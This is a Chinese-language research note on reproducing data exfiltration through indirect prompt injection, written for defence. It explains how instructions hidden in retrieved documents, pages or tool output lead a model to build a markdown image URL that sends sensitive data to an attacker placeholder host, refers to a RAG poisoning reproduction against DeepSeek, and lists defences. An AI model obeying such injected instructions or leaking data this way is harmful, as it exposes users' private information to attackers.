# 前沿复现笔记:间接注入数据外泄(Data Exfiltration via Indirect Injection)

## 手法 / 出处
- 来源:Greshake et al. 2023《Not what you've signed up for》等间接注入研究。
- 类别:OWASP LLM01(间接注入)+ LLM06(过度授权)/ 数据泄露。

## 1. 原理
攻击者不直接对话,而是在模型会读取的**外部数据**(网页、邮件、文档、工具返回结果)里藏指令,
诱导模型把**敏感数据**(对话历史、用户信息、内部资料)**外泄**——
常见手段是诱导模型构造一个带数据的 URL/图片地址(如 `![](http://attacker/?d=<敏感数据>)`),
渲染时即把数据发给攻击者。在能联网/能调工具的 Agent 上危害更大。

## 2. 与我的复现/对应
- 我已复现的 [真实 RAG 注入验证](../03-agent-rag-security/real-rag-injection/) 正是间接注入:投毒文档劫持真实 DeepSeek。
- [多智能体安全](../03-agent-rag-security/multi-agent-security/) 演示了注入跨 Agent 传播到能执行动作的下游。
- 数据外泄是间接注入的"高危后果版":目标从"改变回答"升级为"把数据带出去"。

## 3. 防御
- **输出端 DLP/外链管控**:对模型输出做机密扫描(复用 [安全网关 check_output](../03-agent-rag-security/llm-security-gateway/)),
  并禁止/审查自动外链请求(图片、跳转)。
- **检索内容注入检测**:外部数据进入上下文前扫描(已在 RAG 注入检测器实现)。
- **最小权限 + 出网隔离**:Agent 不应能随意外联(参考 SSRF 防护)。
- **指令与数据分离**:外部内容只当数据,不当指令。

## 4. 转化
- 给安全网关的输出扫描增加"可疑外链 + 携带数据参数"的规则。
- 一句话:**间接注入最危险的不是改回答,而是借模型之手把数据送出去;
  防御要同时管输入(注入检测)、动作(最小权限/出网隔离)、输出(DLP/外链管控)。**
